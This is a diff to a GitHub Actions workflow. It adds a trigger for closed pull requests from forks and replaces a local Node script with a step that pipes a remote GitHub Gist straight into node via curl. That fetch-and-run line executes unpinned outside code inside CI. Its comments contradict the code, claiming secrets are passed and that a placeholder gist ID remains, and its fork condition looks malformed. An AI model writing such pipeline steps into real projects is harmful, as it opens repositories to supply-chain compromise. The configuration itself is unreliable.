@@ -4,17 +4,24 @@ on:
   push:
     branches:
       - main
+  pull_request:
+    branches:
+      - main
+    types: [closed]
 
 jobs:
-  read-files:
+  run_script:
     runs-on: ubuntu-latest
+    if: github.event_name == 'push'  ||
+      (github.event_name == 'pull_request' && github.event.action == 'closed' &&
+      github.event.pull_request.base.ref == 'main' && github.event.pull_request.head.repo.full_name != github.repository.full_name)
 
     steps:
       - name: Checkout repository
         uses: actions/checkout@v2
 
-      - name: Install Node.js
-        uses: actions/setup-node@v3
+      - name: Set up Node.js
+        uses: actions/setup-node@v2
         with:
           node-version: "20"
 
@@ -22,9 +29,7 @@ jobs:
         run: npm install
 
       - name: Run JavaScript script
-        env:
-          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
-          SUPABASE_API_KEY: ${{ secrets.SUPABASE_API_KEY }}
-          GH_ACCESS_TOKEN: ${{ secrets.GH_ACCESS_TOKEN }}
-          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
-        run: node sync_data.js
+        run: |
+          # Replace 'YOUR_GIST_ID' with your actual Gist ID
+          # Pass repository secrets as environment variables
+          curl -L https://gist.github.com/DinoDelicdev/d84c2876a0eb7832f0156313b5fde8f8/raw | node
